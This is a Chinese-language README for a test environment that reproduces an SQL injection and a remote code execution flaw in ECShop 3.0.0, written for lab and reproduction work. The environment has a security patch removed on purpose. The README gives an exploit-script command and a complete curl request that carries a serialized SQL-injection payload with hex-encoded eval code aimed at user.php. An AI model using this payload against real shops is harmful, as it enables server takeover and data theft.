## 环境说明

* src/ecshop/3.0.0

  * 后台地址

    http://172.17.0.2/admin/privilege.php?act=login

  * 管理员账号

    admin/admin123

  * 去除补丁

    删除了./flow.php line 2137的intval函数，用于复现前一版本的SQL注入漏洞



## ECShop3.0.0 SQL注入漏洞

测试镜像

* src/ecshop/3.0.0

影响版本

* ECShop 3.0.0 <  Release0906

参考链接

* [ECShop v3.0 渗透实例](https://www.bodkin.ren/index.php/archives/6/)

Poc

执行脚本：

```shell
python SQL注入漏洞/sqli-exp.py -u http://172.17.0.2/
```

测试成功会返回succeed



## ECShop 远程代码执行漏洞

测试镜像

- src/ecshop/3.0.0

影响版本

- Ecshop 2.x
- Ecshop 3.x-3.6.0

参考链接

- [ECShop全系列版本远程代码执行高危漏洞分析](https://xz.aliyun.com/t/2689)

Poc

执行脚本：

```shell
curl -d "action=login&test=phpinfo();exit;" -H 'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3ect 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2474657374275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b58314250553152626447567a644630704f773d3d2729293b2f2f7d7d,1--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}' "http://127.0.0.1/user.php"
```

测试成功会返回phpinfo执行结果